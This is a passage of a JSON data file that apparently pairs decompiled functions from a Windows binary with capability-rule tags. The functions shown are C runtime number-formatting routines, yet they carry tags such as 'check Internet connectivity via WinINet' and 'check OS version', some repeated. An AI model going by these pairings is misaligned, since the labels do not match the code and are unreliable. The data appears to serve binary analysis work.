1;\n                            uStack204 = uStack204 - 1;\n                            fcn.14001cfa0(arg1_02);\n                            fcn.14001cfa0(uVar25);\n                            goto code_r0x00014001725a;\n                        }\n                        uStack176 = uStack176 - 1;\n                        uStack264 = uVar16;\n                    }\ncode_r0x000140016c30:\n                    fcn.14001cfa0(arg1_02);\n                    fcn.14001cfa0(uVar25);\n                    if (uVar20 != 0) goto code_r0x000140017380;\n                    if ((uStack176 + uStack172 == iVar6) && (iStack248 != 0)) {\n                        dVar29 = dVar29 * *0x14010f880;\n                        dVar30 = CONCAT44(uVar32, uVar31) - *0x14010f870;\n                        if ((dVar29 ^ SUB168(auVar38, 0)) <= dVar30) {\n                            if ((dVar29 < dVar30) &&\n                               (CONCAT44(uVar32, uVar31) <= *0x14010f860 - dVar29 &&\n                                *0x14010f860 - dVar29 != CONCAT44(uVar32, uVar31))) goto code_r0x000140017370;\n                        }\n                        else if (dVar29 <= CONCAT44(uVar32, uVar31) && CONCAT44(uVar32, uVar31) != dVar29)\n                        goto code_r0x000140017370;\n                    }\n                    if (uStack264 == 0) goto code_r0x00014001725a;\n                }\n                fcn.14001cfa0(arg1_01);\n                fcn.14001cfa0(arg1_00);\n                fcn.14001cfa0(uStack280);\n                fcn.14001cfa0(uVar12);\n            } while( true );\n        }\n        uStack264 = 1;\n        iVar6 = uStack204 + 1;\n        uStack204 = uVar5;\n        uStack172 = uVar5;\n        if (uVar5 <= iVar6) goto code_r0x00014001687a;\n        *(auStack160[0] + 0x14) = 0;\n        *arg4 = uVar5;\n        goto code_r0x000140017578;\n    }\n    if (uVar17 == 0) goto code_r0x000140016840;\n    uStack176 = uVar17 + uStack176;\n    if (0 < uStack176) {\n        fcn.14001c7b0(auStack160[0], uVar5 - uStack172);\n        goto code_r0x000140016840;\n    }\n    if (-2 < uStack176) {\n        uStack176 = 1;\n        *(auStack160[0] + 0x14) = 0x100000001;\n        goto code_r0x000140016840;\n    }\n    *(auStack160[0] + 0x14) = 0;\n    *arg4 = uVar5;\n    if (uStack208 != 0) goto code_r0x000140017578;\n    uVar7 = (0 < *(auStack160[0] + 0x14)) * 2 | 0x50;\n    goto code_r0x000140017698;\ncode_r0x000140017370:\n    uStack180 = uStack180 | uVar19;\ncode_r0x000140017380:\n    uStack208 = uVar28;\n    uVar27 = uStack176;\n    if (uStack264 == 0) {\ncode_r0x000140017601:\n        uVar7 = uVar1 - uVar27;\n        uStack264 = uVar7;\n        if (uVar7 != 0) {\n            if (uVar7 < 1) {\n                fcn.14001c7b0(auStack160[0], uVar27 - uVar1);\n            }\n            else {\n                auStack160[0] = fcn.14001d470(auStack160[0], uVar7);\n            }\n            uStack264 = 0;\n            uStack172 = uStack172 - uVar7;\n        }\n    }\n    goto code_r0x000140017393;\n    while (uVar7 = *puVar15,  puVar15 = puVar15 + 1,  uVar7 == 0xffffffff) {\ncode_r0x0001400179ea:\n        if (auStack160[0] + 0x18 + (uStack176 >> 5) <= puVar15) {\n            if (((uStack176 & 0x1f) == 0) || ((-1 << (uStack176 & 0x1f) | *puVar15) == 0xffffffff)) {\n                uStack176 = 1;\n                *(auStack160[0] + 0x14) = 0x100000001;\n                uStack180 = 0x21;\n                uStack172 = (uVar1 - 1) + uVar5;\n                uVar27 = uStack264;\n                goto code_r0x000140017601;\n            }\n            break;\n        }\n    }\n    uStack180 = 0x11;\n    if ((*(auStack160[0] + 0x18) & 1) != 0) {\ncode_r0x000140017cad:\n        auStack160[0] = fcn.140015b30(auStack160[0]);\n        puVar15 = auStack160[0] + 0x18 + (*(auStack160[0] + 0x14) + -1) * 4;\n        uVar7 = 0x1f;\n        if (*puVar15 != 0) {\n            for (; *puVar15 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n            }\n        }\n        if ((-uStack176 & 0x1f) != (uVar7 ^ 0x1f)) {\n            uStack176 = uStack176 + 1;\n        }\n        uStack180 = 0x21;\n        goto code_r0x000140017380;\n    }\ncode_r0x000140017393:\n    *arg4 = uStack172;\n    fcn.14001cfa0(arg1_01);\n    fcn.14001cfa0(arg1_00);\n    fcn.14001cfa0(uStack280);\n    fcn.14001cfa0(iVar11);\n    fcn.14001cfa0(uVar12);\n    if (arg3[2] < uStack172) {\n        uVar7 = arg3[3] & 3;\n        if (uVar7 == 2) {\n            if (iStack252 == 0) goto code_r0x000140017728;\n        }\n        else if (uVar7 == 3) {\n            if (iStack252 != 0) goto code_r0x000140017728;\n        }\n        else if (uVar7 == 1) {\ncode_r0x000140017728:\n            uStack180 = 0xa3;\n            *(auStack160[0] + 0x14) = 0;\n            puVar14 = sub.msvcrt.dll__errno();\n            *puVar14 = 0x22;\n            *arg4 = arg3[2] + 1;\n            goto code_r0x000140017480;\n        }\n        fcn.14001cfa0(auStack160[0]);\n        uVar7 = *arg3;\n        auStack160[0] = 0;\n        uStack180 = 0x11;\n        *arg4 = arg3[2];\n        uVar12 = in_stack_00000028 + (uVar7 + 0x1f >> 5) * 4;\n        if (in_stack_00000028 < uVar12) {\n            sub.msvcrt.dll_memset();\n        }\n        uVar7 = uVar7 & 0x1f;\n        if (uVar7 != 0) {\n            puVar15 = uVar12 - 4;\n            *puVar15 = *puVar15 >> (0x20U - uVar7 & 0x1f);\n        }\n    }\ncode_r0x000140017480:\n    if (uStack264 != 0) {\n        if (uStack208 == 0) {\n            uVar7 = (0 < *(auStack160[0] + 0x14)) * 2 | uStack180 & 0xfffffff8;\n            uVar5 = uStack180 & 0x30;\n            uStack180 = uVar7;\n            if (uVar5 != 0) {\ncode_r0x000140017698:\n                uStack180 = uVar7 | 0x40;\n                puVar14 = sub.msvcrt.dll__errno();\n                *puVar14 = 0x22;\n            }\n        }\n        else {\ncode_r0x000140017578:\n            *(auStack160[0] + 0x14) = 0;\n            uStack180 = 0x50;\n            puVar14 = sub.msvcrt.dll__errno();\n            *puVar14 = 0x22;\n        }\n    }\ncode_r0x000140016528:\n    if (arg2 != NULL) {\n        *arg2 = pcStack168;\n    }\n    if (iStack252 != 0) {\n        uStack180 = uStack180 | 8;\n    }\ncode_r0x000140016556:\n    if (auStack160[0] != 0) {\n        fcn.14001dbd0(in_stack_00000028, uVar1, auStack160[0]);\n        fcn.14001cfa0(auStack160[0]);\n    }\n    return uStack180;\n}\n",
        "token_count": 11529
    },
    "1400183c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400183c0(uint64_t arg1, uint64_t noname_1, int64_t *arg3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    ulong arg1_00;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    uint8_t uVar11;\n    int32_t iVar12;\n    uint8_t uVar13;\n    int32_t iVar14;\n    uint8_t *puVar15;\n    uint8_t uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    bool bVar19;\n    ulong var_8h;\n    uchar auStack104 [32];\n    uint8_t auStack72 [8];\n    \n    uVar16 = arg1 & 0xffffffff;\n    iVar17 = arg1 & 0xffffffff;\n    if (arg1 == 0x6f) {\n        iVar18 = *(arg3 + 2);\n        uVar10 = *(arg3 + 1);\n        if ((uVar10 & 0x1000) != 0) {\n            arg1_00 = 3;\n            goto code_r0x000140018409;\n        }\n        iVar14 = *(arg3 + 0xc);\n        iVar3 = fcn.1400147b0(arg1);\n        uVar4 = 3;\n        uVar11 = 7;\n        puVar6 = &stack0xffffffffffffff98 + -iVar3;\n        puVar9 = &stack0xffffffffffffffb8 + -iVar3;\ncode_r0x0001400184cd:\n        puVar5 = puVar6;\n        puVar15 = puVar9;\n        if (noname_1 == 0) goto code_r0x000140018468;\ncode_r0x0001400184d5:\n        puVar7 = puVar15;\n        do {\n            puVar9 = puVar7 + 1;\n            uVar1 = uVar11 & noname_1;\n            uVar13 = uVar1 + 0x30;\n            uVar1 = uVar1 + 0x37 | uVar16 & 0x20;\n            if (uVar13 < 0x3a) {\n                uVar1 = uVar13;\n            }\n            noname_1 = noname_1 >> (uVar4 & 0x3f);\n            *puVar7 = uVar1;\n            puVar7 = puVar9;\n        } while (noname_1 != 0);\n        puVar5 = puVar6;\n        if (puVar9 == puVar15) goto code_r0x000140018468;\n        if (iVar18 < 1) goto code_r0x00014001847a;\ncode_r0x00014001851b:\n        iVar2 = puVar9 - puVar15;\n        iVar12 = iVar18 - iVar2;\n        if (0 < iVar12) {\n            puVar7 = puVar9 + iVar12;\n            *(puVar6 + -8) = 0x140018546;\n            sub.msvcrt.dll_memset(puVar9, 0x30, iVar12);\n            goto code_r0x000140018546;\n        }\n        puVar7 = puVar9;\n        if (iVar17 == 0x6f) {\ncode_r0x000140018484:\n            if ((*(arg3 + 9) & 8) != 0) {\n                *puVar7 = 0x30;\n                puVar7 = puVar7 + 1;\n            }\n            goto code_r0x000140018546;\n        }\n        if (puVar9 == puVar15) goto code_r0x0001400187e8;\n        if (iVar2 < iVar14) {\n            uVar10 = *(arg3 + 1);\n            iVar14 = iVar14 - iVar2;\n            *(arg3 + 0xc) = iVar14;\n            if ((uVar10 & 0x800) == 0) goto code_r0x0001400185f9;\n            goto code_r0x0001400185d0;\n        }\n        *(arg3 + 0xc) = 0xffffffff;\ncode_r0x000140018570:\n        puVar8 = puVar9;\n        if ((*(arg3 + 9) & 8) != 0) {\n            *puVar9 = uVar16;\n            puVar8 = puVar9 + 2;\n            puVar9[1] = 0x30;\n        }\ncode_r0x000140018581:\n        iVar14 = -1;\n        puVar9 = puVar8;\n    }\n    else {\n        iVar18 = *(arg3 + 2);\n        uVar10 = *(arg3 + 1);\n        if ((uVar10 & 0x1000) == 0) {\n            iVar14 = *(arg3 + 0xc);\n            iVar3 = fcn.1400147b0(arg1);\n            uVar4 = 4;\n            uVar11 = 0xf;\n            puVar6 = &stack0xffffffffffffff98 + -iVar3;\n            puVar9 = &stack0xffffffffffffffb8 + -iVar3;\n            goto code_r0x0001400184cd;\n        }\n        arg1_00 = 4;\ncode_r0x000140018409:\n        iVar14 = *(arg3 + 0xc);\n        iVar3 = fcn.1400147b0(arg1_00);\n        uVar4 = arg1_00;\n        iVar3 = -iVar3;\n        puVar6 = &stack0xffffffffffffff98 + iVar3;\n        puVar9 = &stack0xffffffffffffffb8 + iVar3;\n        uVar11 = (iVar17 != 0x6f) * '\\b' + 7;\n        puVar5 = &stack0xffffffffffffff98 + iVar3;\n        puVar15 = puVar9;\n        if (noname_1 != 0) goto code_r0x0001400184d5;\ncode_r0x000140018468:\n        *(arg3 + 1) = uVar10 & 0xfffff7ff;\n        puVar6 = puVar5;\n        puVar7 = puVar9;\n        if (0 < iVar18) goto code_r0x00014001851b;\ncode_r0x00014001847a:\n        if (iVar17 == 0x6f) goto code_r0x000140018484;\ncode_r0x000140018546:\n        puVar9 = puVar7;\n        if ((puVar7 == puVar15) && (iVar18 != 0)) {\ncode_r0x0001400187e8:\n            *puVar9 = 0x30;\n            iVar2 = (puVar9 + 1) - puVar15;\n            puVar9 = puVar9 + 1;\n        }\n        else {\n            iVar2 = puVar7 - puVar15;\n        }\n        if (iVar14 <= iVar2) {\n            *(arg3 + 0xc) = 0xffffffff;\n            if (iVar17 == 0x6f) {\n                if (puVar9 <= puVar15) {\n                    return;\n                }\n                uVar10 = *(arg3 + 1);\n                iVar17 = -2;\n                iVar14 = -1;\n                goto code_r0x000140018650;\n            }\n            goto code_r0x000140018570;\n        }\n        iVar14 = iVar14 - iVar2;\n        uVar10 = *(arg3 + 1);\n        *(arg3 + 0xc) = iVar14;\n        if ((iVar17 == 0x6f) || (puVar7 = puVar9,  (uVar10 & 0x800) == 0)) {\n            if ((-1 < iVar18) || ((uVar10 & 0x600) != 0x200)) {\ncode_r0x0001400185f9:\n                iVar17 = iVar14 + -1;\n                if ((uVar10 & 0x400) == 0) {\n                    do {\n                        *(puVar6 + -8) = 0x14001861d;\n                        fcn.140017f90(0x20, arg3);\n                        bVar19 = iVar17 != 0;\n                        iVar14 = iVar17 + -1;\n                        iVar17 = iVar14;\n                    } while (bVar19);\n                    iVar17 = -2;\n                    if (puVar15 < puVar9) goto code_r0x00014001864d;\n                    return;\n                }\n                if (puVar9 <= puVar15) goto code_r0x0001400186b4;\n                goto code_r0x000140018650;\n            }\n            puVar8 = puVar9 + iVar14;\n            *(puVar6 + -8) = 0x1400187c0;\n            sub.msvcrt.dll_memset(puVar9, 0x30, iVar14);\n            if (iVar17 != 0x6f) goto code_r0x0001400187ca;\n            goto code_r0x000140018581;\n        }\ncode_r0x0001400185d0:\n        iVar14 = iVar14 + -2;\n        puVar8 = puVar7;\n        if (iVar14 < 1) {\ncode_r0x0001400185dd:\n            *puVar8 = uVar16;\n            puVar8[1] = 0x30;\n            puVar9 = puVar8 + 2;\n        }\n        else {\n            if ((-1 < iVar18) || ((uVar10 & 0x600) != 0x200)) {\n                *puVar7 = uVar16;\n                puVar9 = puVar7 + 2;\n                puVar7[1] = 0x30;\n                goto code_r0x0001400185f9;\n            }\n            puVar8 = puVar7 + iVar14;\n            *(puVar6 + -8) = 0x140018862;\n            sub.msvcrt.dll_memset(puVar7, 0x30, iVar14);\ncode_r0x0001400187ca:\n            iVar14 = -1;\n            puVar9 = puVar8;\n            if ((uVar10 & 0x800) != 0) goto code_r0x0001400185dd;\n        }\n    }\n    if (puVar9 <= puVar15) {\n        return;\n    }\n    uVar10 = *(arg3 + 1);\n    iVar17 = iVar14 + -1;\ncode_r0x000140018650:\n    do {\n        puVar9 = puVar9 + -1;\n        if (((uVar10 & 0x4000) == 0) && (iVar18 = *(arg3 + 0x24),  *(arg3 + 5) == iVar18 || *(arg3 + 5) < iVar18)) {\ncode_r0x000140018642:\n            *(arg3 + 0x24) = iVar18 + 1;\n        }\n        else {\n            if ((uVar10 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar9;\n                iVar18 = *(arg3 + 0x24);\n                goto code_r0x000140018642;\n            }\n            *(puVar6 + -8) = 0x140018677;\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n        }\n        iVar18 = iVar17;\n        if (puVar9 <= puVar15) {\n            while (iVar17 = iVar18,  0 < iVar14) {\n                uVar10 = *(arg3 + 1);\ncode_r0x0001400186b4:\n                if (((uVar10 & 0x4000) != 0) ||\n                   (iVar18 = *(arg3 + 0x24),  *(arg3 + 5) != iVar18 && iVar18 <= *(arg3 + 5))) {\n                    if ((uVar10 & 0x2000) == 0) {\n                        *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                        iVar18 = *(arg3 + 0x24);\n                    }\n                    else {\n                        *(puVar6 + -8) = 0x1400186d9;\n                        sub.msvcrt.dll_fputc(0x20);\n                        iVar18 = *(arg3 + 0x24);\n                    }\n                }\n                *(arg3 + 0x24) = iVar18 + 1;\n                iVar18 = iVar17 + -1;\n                iVar14 = iVar17;\n            }\n            return;\n        }\ncode_r0x00014001864d:\n        uVar10 = *(arg3 + 1);\n    } while( true );\n}\n",
        "token_count": 2877
    },
    "14001887": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140018870(uint64_t arg1, int64_t *arg2)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong var_8h;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    \n    iVar2 = *(arg2 + 2);\n    uVar9 = *(arg2 + 1);\n    iVar5 = *(arg2 + 0xc);\n    auStack112[0] = 0x1400188c7;\n    iVar3 = fcn.1400147b0(arg1);\n    iVar3 = -iVar3;\n    pcVar1 = &stack0xffffffffffffffb8 + iVar3;\n    if ((uVar9 & 0x80) == 0) {\ncode_r0x0001400188e6:\n        pcVar6 = pcVar1;\n        if (arg1 != 0) goto code_r0x0001400188f2;\n    }\n    else {\n        if (-1 < arg1) {\n            uVar9 = uVar9 & 0xffffff7f;\n            *(arg2 + 1) = uVar9;\n            goto code_r0x0001400188e6;\n        }\n        arg1 = -arg1;\ncode_r0x0001400188f2:\n        pcVar6 = pcVar1;\n        while( true ) {\n            pcVar7 = pcVar6;\n            pcVar6 = pcVar7 + 1;\n            uVar4 = arg1 / 10;\n            *pcVar7 = arg1 + uVar4 * -10 + '0';\n            if (arg1 < 10) break;\n            arg1 = uVar4;\n            if ((((pcVar1 != pcVar6) && ((uVar9 & 0x1000) != 0)) && (*(arg2 + 4) != 0)) &&\n               ((pcVar6 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar6 = ',';\n                pcVar6 = pcVar7 + 2;\n            }\n        }\n    }\n    pcVar7 = pcVar6;\n    if (iVar2 < 1) {\ncode_r0x0001400189b0:\n        pcVar6 = pcVar7;\n        if ((pcVar1 != pcVar7) || (iVar2 == 0)) goto code_r0x0001400189c1;\n    }\n    else {\n        iVar8 = iVar2 - (pcVar6 - pcVar1);\n        if (0 < iVar8) {\n            pcVar7 = pcVar6 + iVar8;\n            *(&stack0xffffffffffffff90 + iVar3) = 0x1400189b0;\n            sub.msvcrt.dll_memset(pcVar6, 0x30, iVar8);\n            goto code_r0x0001400189b0;\n        }\n        pcVar7 = pcVar1;\n        if (pcVar1 != pcVar6) goto code_r0x0001400189c1;\n    }\n    *pcVar7 = '0';\n    pcVar6 = pcVar7 + 1;\ncode_r0x0001400189c1:\n    if (0 < iVar5) {\n        iVar5 = iVar5 - (pcVar6 - pcVar1);\n        *(arg2 + 0xc) = iVar5;\n        if (0 < iVar5) {\n            if ((uVar9 & 0x1c0) != 0) {\n                *(arg2 + 0xc) = iVar5 + -1;\n            }\n            if ((iVar2 < 0) && ((uVar9 & 0x600) == 0x200)) {\n                iVar2 = *(arg2 + 0xc);\n                *(arg2 + 0xc) = iVar2 + -1;\n                if (0 < iVar2) {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140018ba9;\n                    sub.msvcrt.dll_memset(pcVar6, 0x30, iVar2);\n                    *(arg2 + 0xc) = 0xffffffff;\n                    pcVar6 = pcVar6 + iVar2;\n                }\n            }\n            else if (((uVar9 & 0x400) == 0) && (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140018bdd;\n                    fcn.140017f90(0x20, arg2);\n                    iVar2 = *(arg2 + 0xc);\n                    *(arg2 + 0xc) = iVar2 + -1;\n                } while (0 < iVar2);\n                uVar9 = *(arg2 + 1);\n            }\n        }\n    }\n    if ((uVar9 & 0x80) == 0) {\n        if ((uVar9 & 0x100) == 0) {\n            if ((uVar9 & 0x40) != 0) {\n                *pcVar6 = ' ';\n                pcVar6 = pcVar6 + 1;\n            }\n        }\n        else {\n            *pcVar6 = '+';\n            pcVar6 = pcVar6 + 1;\n        }\n    }\n    else {\n        *pcVar6 = '-';\n        pcVar6 = pcVar6 + 1;\n    }\n    if (pcVar1 < pcVar6) {\n        do {\n            pcVar6 = pcVar6 + -1;\n            if (((uVar9 & 0x4000) == 0) && (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) == iVar2 || *(arg2 + 5) < iVar2)) {\ncode_r0x000140018a2a:\n                *(arg2 + 0x24) = iVar2 + 1;\n            }\n            else {\n                if ((uVar9 & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = *pcVar6;\n                    iVar2 = *(arg2 + 0x24);\n                    goto code_r0x000140018a2a;\n                }\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140018a62;\n                sub.msvcrt.dll_fputc();\n                *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar6) break;\n            uVar9 = *(arg2 + 1);\n        } while( true );\n    }\n    iVar2 = *(arg2 + 0xc);\n    while( true ) {\n        *(arg2 + 0xc) = iVar2 + -1;\n        if (iVar2 < 1) break;\n        if (((*(arg2 + 1) & 0x4000) != 0) ||\n           (iVar5 = *(arg2 + 0x24),  iVar2 = iVar2 + -1,  *(arg2 + 5) != iVar5 && iVar5 <= *(arg2 + 5))) {\n            if ((*(arg2 + 1) & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar5 = *(arg2 + 0x24);\n                iVar2 = *(arg2 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140018aba;\n                sub.msvcrt.dll_fputc();\n                iVar5 = *(arg2 + 0x24);\n                iVar2 = *(arg2 + 0xc);\n            }\n        }\n        *(arg2 + 0x24) = iVar5 + 1;\n    }\n    return;\n}\n",
        "token_count": 1778
    },
    "140018d5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140018d50(ulong arg1, char *arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    \n    iVar4 = *(arg4 + 0xc);\n    if (arg3 < 1) {\n        if (iVar4 < 1) {\n            if ((iVar4 == 0) && (*(arg4 + 0x10) < 0)) {\n                iVar4 = -*(arg4 + 0x10);\n                *(arg4 + 0xc) = iVar4;\ncode_r0x000140018fd8:\n                if ((*(arg4 + 8) & 0x800) != 0) goto code_r0x000140018d91;\n                if ((0 < arg3) && ((*(arg4 + 8) & 0x1000) != 0)) goto code_r0x000140018ff5;\n                goto code_r0x000140018da9;\n            }\n        }\n        else {\n            iVar3 = *(arg4 + 0x10);\n            iVar4 = iVar4 + -1;\n            if (iVar3 < iVar4) goto code_r0x000140018d84;\n        }\n        *(arg4 + 0xc) = 0xffffffff;\n        if (arg1 == 0) goto code_r0x000140018df3;\ncode_r0x000140018ed0:\n        fcn.140017f90(0x2d, arg4);\n    }\n    else {\n        if (iVar4 < arg3) {\n            *(arg4 + 0xc) = 0xffffffff;\n            if (((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) {\n                iVar4 = -1;\n                uVar2 = (arg3 + 2U) / 3;\n                if ((arg3 + 2U) / 3 != 1) {\ncode_r0x00014001907b:\n                    iVar3 = (uVar2 - 1) - iVar4;\n                    do {\n                        if (iVar4 < 1) goto code_r0x000140018deb;\n                        iVar4 = iVar4 + -1;\n                        *(arg4 + 0xc) = iVar4;\n                    } while (iVar3 + iVar4 != 0);\n                    goto code_r0x000140018da5;\n                }\n            }\ncode_r0x000140018deb:\n            if (arg1 != 0) goto code_r0x000140018ed0;\ncode_r0x000140018df3:\n            uVar2 = *(arg4 + 8);\n        }\n        else {\n            iVar3 = *(arg4 + 0x10);\n            iVar4 = iVar4 - arg3;\n            if (iVar3 < iVar4) {\ncode_r0x000140018d84:\n                iVar4 = iVar4 - iVar3;\n                *(arg4 + 0xc) = iVar4;\n                if (iVar3 < 1) goto code_r0x000140018fd8;\ncode_r0x000140018d91:\n                iVar4 = iVar4 + -1;\n                *(arg4 + 0xc) = iVar4;\n                if ((0 < arg3) && ((*(arg4 + 9) & 0x10) != 0)) {\ncode_r0x000140018ff5:\n                    if (*(arg4 + 0x20) != 0) goto code_r0x0001400190e2;\n                }\n            }\n            else {\n                *(arg4 + 0xc) = 0xffffffff;\n                if (((*(arg4 + 9) & 0x10) == 0) || (*(arg4 + 0x20) == 0)) goto code_r0x000140018deb;\n                iVar4 = -1;\ncode_r0x0001400190e2:\n                uVar2 = (arg3 + 2) / 3;\n                if (uVar2 != 1) goto code_r0x00014001907b;\n            }\ncode_r0x000140018da5:\n            if (iVar4 < 1) goto code_r0x000140018deb;\ncode_r0x000140018da9:\n            if (arg1 != 0) {\n                *(arg4 + 0xc) = iVar4 + -1;\n                if ((iVar4 + -1 == 0) || ((*(arg4 + 8) & 0x600) != 0)) goto code_r0x000140018ed0;\ncode_r0x000140018f93:\n                iVar4 = iVar4 + -2;\ncode_r0x000140018f96:\n                *(arg4 + 0xc) = iVar4;\n                do {\n                    fcn.140017f90(0x20, arg4);\n                    iVar4 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar4 + -1;\n                } while (0 < iVar4);\n                goto code_r0x000140018deb;\n            }\n            uVar2 = *(arg4 + 8);\n            if ((uVar2 & 0x1c0) == 0) {\n                iVar4 = iVar4 + -1;\n                if ((uVar2 & 0x600) == 0) goto code_r0x000140018f96;\n            }\n            else {\n                *(arg4 + 0xc) = iVar4 + -1;\n                if ((iVar4 + -1 != 0) && ((uVar2 & 0x600) == 0)) goto code_r0x000140018f93;\n            }\n        }\n        if ((uVar2 & 0x100) == 0) {\n            if ((uVar2 & 0x40) != 0) {\n                fcn.140017f90(0x20, arg4);\n            }\n        }\n        else {\n            fcn.140017f90(0x2b, arg4);\n        }\n    }\n    if ((0 < *(arg4 + 0xc)) && ((*(arg4 + 8) & 0x600) == 0x200)) {\n        *(arg4 + 0xc) = *(arg4 + 0xc) + -1;\n        do {\n            fcn.140017f90(0x30, arg4);\n            iVar4 = *(arg4 + 0xc);\n            *(arg4 + 0xc) = iVar4 + -1;\n        } while (0 < iVar4);\n    }\n    if (arg3 < 1) {\n        fcn.140017f90(0x30, arg4);\n        iVar4 = *(arg4 + 0x10);\n        if ((0 < iVar4) || ((*(arg4 + 9) & 8) != 0)) goto code_r0x000140018f48;\n        if (arg3 == 0) goto code_r0x000140018e91;\n    }\n    else {\n        while( true ) {\n            cVar1 = *arg2;\n            uVar5 = 0x30;\n            if (cVar1 != '\\0') {\n                arg2 = arg2 + 1;\n                uVar5 = cVar1;\n            }\n            fcn.140017f90(uVar5, arg4);\n            arg3._0_4_ = arg3 + -1;\n            if (arg3 == 0) break;\n            if ((((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) && (arg3 * -0x55555555 < 0x55555556)) {\n                fcn.140017ff0(arg4 + 0x20, 1, arg4);\n            }\n        }\n        iVar4 = *(arg4 + 0x10);\n        if (0 < iVar4) {\n            fcn.140018c00(arg4);\n            goto code_r0x000140018f13;\n        }\n        if ((*(arg4 + 9) & 8) == 0) {\ncode_r0x000140018e91:\n            *(arg4 + 0x10) = iVar4 + -1;\n            return;\n        }\ncode_r0x000140018f48:\n        fcn.140018c00(arg4);\n        if (arg3 == 0) goto code_r0x000140018f13;\n        iVar4 = *(arg4 + 0x10);\n    }\n    *(arg4 + 0x10) = iVar4 + arg3;\n    do {\n        fcn.140017f90(0x30, arg4);\n        arg3._0_4_ = arg3 + 1;\n    } while (arg3 != 0);\ncode_r0x000140018f13:\n    while (iVar4 = *(arg4 + 0x10),  *(arg4 + 0x10) = iVar4 + -1,  0 < iVar4) {\n        cVar1 = *arg2;\n        uVar5 = 0x30;\n        if (cVar1 != '\\0') {\n            arg2 = arg2 + 1;\n            uVar5 = cVar1;\n        }\n        fcn.140017f90(uVar5, arg4);\n    }\n    return;\n}\n",
        "token_count": 2081
    },
    "14001950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140019500(uint64_t arg1, ulong arg2, int64_t *arg3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    char *pcVar11;\n    uint8_t *puVar12;\n    char *pcVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    ulong auStack112 [2];\n    int16_t iStack90;\n    uint8_t uStack88;\n    uint8_t auStack87 [15];\n    char acStack72 [24];\n    \n    uVar6 = *(arg3 + 2);\n    if ((arg2 == 0) && (arg1 == 0)) {\n        if (uVar6 < 0xf) {\n            arg2._0_2_ = 0;\ncode_r0x0001400195d5:\n            uVar3 = ('\\x0f' - uVar6) * '\\x04';\n            uVar10 = (4 << (('\\x0e' - uVar6) * '\\x04' & 0x3fU)) + (arg1 >> 1);\n            if (uVar10 < 0) {\n                arg2._0_2_ = arg2 + 4;\n                arg1 = (uVar10 >> 3) >> (uVar3 & 0x3f);\n            }\n            else {\n                arg1 = uVar10 * 2 >> (uVar3 & 0x3f);\n                if ((arg1 == 0) && (uVar6 == 0)) {\n                    uVar6 = *(arg3 + 1);\n                    uVar10 = arg2;\n                    goto code_r0x000140019626;\n                }\n            }\n            iVar7 = uVar6 + 1;\n            uVar10 = arg2;\n        